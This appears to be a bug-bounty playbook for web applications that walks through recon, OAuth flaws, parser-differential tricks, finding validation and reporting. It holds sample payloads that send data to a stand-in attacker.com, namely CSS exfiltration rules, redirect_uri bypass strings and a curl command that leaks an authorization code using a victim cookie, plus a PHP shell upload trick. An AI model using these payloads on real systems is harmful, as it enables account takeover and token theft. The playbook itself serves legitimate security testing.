# Web Application Security Hunt

**Target Type:** Web applications with authentication, OAuth, forms, APIs

**Skills Used:**
- yandex-recon-specialist.md
- oauth-security-auditor.md
- parser-differential-tester.md
- ai-self-validator.md

**Expected Time:** 2-4 hours per target

---

## Phase 1: Reconnaissance (30-60 min)

### Step 1.1: Yandex Dorking
**Activate:** `yandex-recon-specialist.md`

**Actions:**
```bash
# Run automated Yandex recon
./yadexloop.sh target.com

# Expected outputs:
# - api.txt (API endpoints)
# - javascript.txt (JS files)
# - auth_admin.txt (login/admin pages)
# - environments.txt (staging/dev)
# - files.txt (config/secrets)
```

**What to Look For:**
- OAuth endpoints (`/oauth/`, `/auth/`, `/login`)
- API endpoints (`/api/`, `/graphql`, `/swagger`)
- Admin panels (`/admin`, `/dashboard`)
- JavaScript files (`_next/static`, `chunk.js`)
- Staging environments (`staging.`, `dev.`, `test.`)

### Step 1.2: Subdomain Enumeration
**Continue with:** `yandex-recon-specialist.md`

**Actions:**
```bash
# Letter-by-letter subdomain brute-force
for letter in {a..z}; do
  yandex search: rhost:com.target.${letter}*
done
```

**Document:**
- All discovered subdomains
- Interesting patterns (api., auth., admin., etc.)

### Step 1.3: JavaScript Analysis
**Actions:**
```bash
# Download all JS files
cat javascript.txt | while read url; do
  wget -q "$url" -P js_files/
done

# Extract endpoints
grep -roh "https://[^\"']*" js_files/ | sort -u > extracted_endpoints.txt
```

**What to Look For:**
- API keys (hardcoded)
- Internal endpoints
- OAuth client IDs
- GraphQL schemas

---

## Phase 2: OAuth Security Testing (60-90 min)

**IF OAuth/SSO detected → Activate:** `oauth-security-auditor.md`

### Step 2.1: OAuth Flow Discovery
**Actions:**
1. Identify OAuth providers (Google, GitHub, Facebook, etc.)
2. Map OAuth channels (web, mobile, API)
3. Document OAuth parameters (client_id, redirect_uri, scope, state)

### Step 2.2: Popup Hijacking Test
**Test for:** Predictable window.open() targets

**PoC:**
```html
<iframe name="oauth-window" src="https://target.com/static/chunk.js"></iframe>
<script>
  // Wait for victim to initiate OAuth
  // OAuth loads in our iframe instead of new window
</script>
```

**Success Criteria:**
- OAuth callback loads in attacker's iframe
- Can capture authorization code

### Step 2.3: redirect_uri Bypass
**Test for:** Double-decode, at-sign tricks, path traversal

**Fuzzing Script:**
```bash
# Test double-encode patterns
for byte1 in {00..ff}; do
  for byte2 in {00..ff}; do
    payload="https://attacker.com%25${byte1}%${byte2}target.com/callback"
    # Test payload
  done
done
```

**Success Criteria:**
- Validator sees target.com
- Browser redirects to attacker.com
- Authorization code leaked

### Step 2.4: Non-Happy Path Testing
**Test for:** Error condition exploitation

**Actions:**
1. Change response_type to invalid value
2. Observe error handling
3. Check if fragments preserved through redirects
4. Test if referer manipulation possible

### Step 2.5: Token Theft Techniques
**Test for:**
- CSS data exfiltration
- Referrer Policy override
- XSS in OAuth callback pages

**CSS Exfiltration PoC:**
```css
input[value^="a"] { background: url(https://attacker.com/?c=a); }
input[value^="b"] { background: url(https://attacker.com/?c=b); }
/* ... for all characters ... */
```

---

## Phase 3: Parser Differential Testing (30-60 min)

**Activate:** `parser-differential-tester.md`

### Step 3.1: Query String Confusion
**Test for:** Duplicate parameter handling

**PoC:**
```
?admin=false&admin=true

WAF checks first: admin=false (allowed)
App uses last: admin=true (bypassed!)
```

### Step 3.2: URL Parser Confusion
**Test for:** Authority confusion

**PoC:**
```
https://target.com@attacker.com/
https://target.com\@attacker.com
https://target.com%00@attacker.com
```

### Step 3.3: Content-Type Confusion
**Test for:** MIME type mismatch

**PoC:**
```
Upload PHP file:
Content-Type: image/jpeg
Filename: shell.php

Validator checks Content-Type → allowed
Handler uses extension → executes!
```

### Step 3.4: Encoding Differentials
**Test for:** Double encoding, null bytes

**PoC:**
```
%252F → %2F → /
file.php%00.jpg
```

---

## Phase 4: Validation (30 min)

**Activate:** `ai-self-validator.md`

### Step 4.1: Challenge Each Finding
**For each potential vulnerability:**

1. **Trace Real Flow**
   - Don't assume based on endpoint names
   - Follow actual code execution
   - Verify data flow end-to-end

2. **Test Protections**
   - Check Origin enforcement
   - Check Referer enforcement
   - Test CSRF tokens
   - Verify authentication requirements

3. **Prove Exploitability**
   - Build working PoC
   - Test in realistic scenario
   - Verify impact is real, not theoretical

4. **Challenge Assumptions**
   - What could make this a false positive?
   - What protections might I have missed?
   - Is there a legitimate reason for this behavior?

### Step 4.2: Devil's Advocate
**Questions to Ask:**
- Can I actually exploit this?
- Does the attack work cross-origin?
- Is the impact real or theoretical?
- Have I tested all protection mechanisms?

### Step 4.3: Decision
**Only Two Outcomes:**
- ✅ **ACCEPT:** Exploitability proven, all protections tested and bypassed
- ❌ **REJECT:** Protections in place, cannot prove exploitability

---

## Phase 5: Reporting (30 min)

### Step 5.1: Document Finding
**Required Information:**
- Vulnerability type
- Affected endpoint/component
- Step-by-step reproduction
- Working PoC (curl command or script)
- Impact analysis
- Suggested remediation

### Step 5.2: Create PoC
**Deterministic PoC (not just theory):**
```bash
# OAuth redirect_uri bypass example
curl -X GET "https://target.com/oauth/authorize" \
  -H "Cookie: session=VICTIM_SESSION" \
  -d "client_id=CLIENT_ID" \
  -d "redirect_uri=https://attacker.com%2523%40target.com/callback" \
  -d "response_type=code"

# Expected: Authorization code leaked to attacker.com
```

### Step 5.3: Log Result
**Manual logging:**
```bash
echo "$(date) | target.com | OAuth redirect_uri bypass | CRITICAL | $14,000" >> hunt-log.txt
```

---

## Success Criteria

### Critical Findings
- ✅ OAuth account takeover (one-click)
- ✅ Authentication bypass
- ✅ Authorization bypass (admin access)
- ✅ RCE via file upload

### High Findings
- ✅ OAuth token theft
- ✅ CSRF on state-changing endpoints
- ✅ XSS (stored or reflected)
- ✅ IDOR with sensitive data access

### Medium Findings
- ✅ Information disclosure
- ✅ Open redirect
- ✅ Missing security headers

---

## Common Patterns (From 72 Resources)

### OAuth Vulnerabilities (8 entries, $12,700+ bounties)
- Popup hijacking via predictable window names
- redirect_uri bypass via double-decode
- Non-happy path exploitation
- CSS data exfiltration ($9,700)
- Referrer Policy override (Chrome 0-day)

### Parser Differentials (Entry #57)
- Query string confusion (first vs last parameter)
- URL authority confusion
- Content-Type mismatch
- Encoding differentials

### Validation Failures (Entry #5)
- 80% of findings fail at validation stage
- Most common: Assumed vulnerability without testing protections
- Solution: Challenge every finding before reporting

---

## Tools Required

### Essential
- Burp Suite (request interception)
- curl (PoC testing)
- Browser DevTools (OAuth flow analysis)

### Specialized
- Yandex search (recon)
- ffuf (fuzzing)
- nuclei (automated scanning)

### Optional
- MCP Inspector (OAuth debugging)
- Playwright (headless browser testing)

---

## Time Allocation

| Phase | Time | Priority |
|-------|------|----------|
| Recon | 30-60 min | HIGH |
| OAuth Testing | 60-90 min | CRITICAL (if OAuth present) |
| Parser Testing | 30-60 min | HIGH |
| Validation | 30 min | CRITICAL |
| Reporting | 30 min | HIGH |

**Total:** 2-4 hours per target

---

## Next Steps After This Workflow

1. **If stuck:** Try `02-api-security-hunt.md` (focus on API endpoints)
2. **If AI features found:** Try `03-ai-app-hunt.md` (prompt injection)
3. **If crypto/DeFi:** Try `04-crypto-hunt.md` (smart contracts)
4. **If nothing found:** Try `05-adaptive-hunt.md` (less common techniques)

---

## References
- Entry #18: OAuth Popup Hijacking
- Entry #48: OAuth redirect_uri Double-Decode ($14k equivalent impact)
- Entry #53: OAuth Non-Happy Path ($3k)
- Entry #57: Parser Differentials for XSS
- Entry #5: AI Self-Validation (80% FP reduction)
